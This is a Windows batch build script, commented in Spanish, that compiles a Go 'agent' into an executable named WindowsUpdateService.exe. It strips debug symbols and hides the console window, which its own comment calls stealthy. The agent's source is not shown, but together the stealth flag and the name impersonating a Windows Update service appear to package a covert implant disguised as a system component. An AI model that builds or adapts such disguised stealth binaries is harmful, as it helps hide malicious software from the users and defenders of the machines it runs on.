@echo off
REM build.bat — Compila agent.go a ejecutable Windows con Go
REM
REM Flags:
REM   -s -w          : elimina simbolos de debug (binario mas pequeño)
REM   -H windowsgui  : sin ventana de consola (sigiloso)

echo [*] Compilando agent.go con Go...
go build -ldflags "-s -w -H windowsgui" -o dist\WindowsUpdateService.exe agent.go

echo.
if exist "dist\WindowsUpdateService.exe" (
    echo [OK] Ejecutable generado: dist\WindowsUpdateService.exe
    for %%I in ("dist\WindowsUpdateService.exe") do echo [*] Tamano: %%~zI bytes
) else (
    echo [ERROR] No se genero el ejecutable. Revisa los mensajes de arriba.
)
